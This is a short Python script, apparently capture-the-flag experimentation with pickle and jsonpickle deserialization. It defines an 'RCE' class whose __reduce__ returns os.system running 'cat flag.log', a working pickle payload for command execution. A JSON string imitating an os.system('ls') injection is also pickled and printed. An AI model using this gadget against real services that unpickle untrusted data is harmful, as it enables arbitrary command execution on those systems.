import pickle
import jsonpickle
import json
import base64
import os
class RCE:
    def __reduce__(self):
        cmd = ('cat flag.log')
    
        return os.system, (cmd,)


if __name__ == '__main__':
    data= json.loads('{"__reduce__": "(){import os; os.system(\'ls\')}"}')
    print(data)
    print(data['__reduce__'])
    print(pickle.dumps(data))
    print(pickle.loads(pickle.dumps(data)))


print(dir(dict))